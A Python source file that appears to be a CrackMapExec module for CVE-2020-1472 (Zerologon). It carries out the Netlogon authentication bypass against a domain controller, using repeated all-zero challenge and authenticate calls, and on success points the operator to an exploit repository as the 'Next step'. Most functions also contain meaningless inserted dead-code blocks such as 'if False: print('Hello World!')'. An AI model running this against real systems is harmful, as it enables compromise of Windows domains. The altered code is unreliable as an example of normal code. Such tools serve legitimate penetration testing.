from impacket.dcerpc.v5 import nrpc, epm, transport
from impacket.dcerpc.v5.rpcrt import DCERPCException
import sys
from cme.logger import cme_logger
MAX_ATTEMPTS = 2000

class CMEModule:
    name = 'zerologon'
    description = 'Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472'
    supported_protocols = ['smb', 'wmi']
    opsec_safe = True
    multiple_hosts = False

    def __init__(self, context=None, module_options=None):
        if False:
            return 10
        self.context = context
        self.module_options = module_options

    def options(self, context, module_options):
        if False:
            print('Hello World!')
        ''

    def on_login(self, context, connection):
        if False:
            for i in range(10):
                print('nop')
        self.context = context
        if self.perform_attack('\\\\' + connection.hostname, connection.host, connection.hostname):
            self.context.log.highlight('VULNERABLE')
            self.context.log.highlight('Next step: https://github.com/dirkjanm/CVE-2020-1472')
            try:
                host = self.context.db.get_hosts(connection.host)[0]
                self.context.db.add_host(host.ip, host.hostname, host.domain, host.os, host.smbv1, host.signing, zerologon=True)
            except Exception as e:
                self.context.log.debug(f'Error updating zerologon status in database')

    def perform_attack(self, dc_handle, dc_ip, target_computer):
        if False:
            for i in range(10):
                print('nop')
        self.context.log.debug('Performing authentication attempts...')
        rpc_con = None
        try:
            binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
            rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
            rpc_con.connect()
            rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
            for attempt in range(0, MAX_ATTEMPTS):
                result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)
                if result:
                    return True
            else:
                self.context.log.highlight('Attack failed. Target is probably patched.')
        except DCERPCException as e:
            self.context.log.fail(f'Error while connecting to host: DCERPCException, which means this is probably not a DC!')

def fail(msg):
    if False:
        i = 10
        return i + 15
    cme_logger.debug(msg)
    cme_logger.fail('This might have been caused by invalid arguments or network issues.')
    sys.exit(2)

def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
    if False:
        for i in range(10):
            print('nop')
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8
    flags = 556793855
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, target_computer + '\x00', ciphertext, flags)
        assert server_auth['ErrorCode'] == 0
        return True
    except nrpc.DCERPCSessionError as ex:
        if ex.get_error_code() == 3221225506:
            return None
        else:
            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
    except BaseException as ex:
        fail(f'Unexpected error: {ex}.')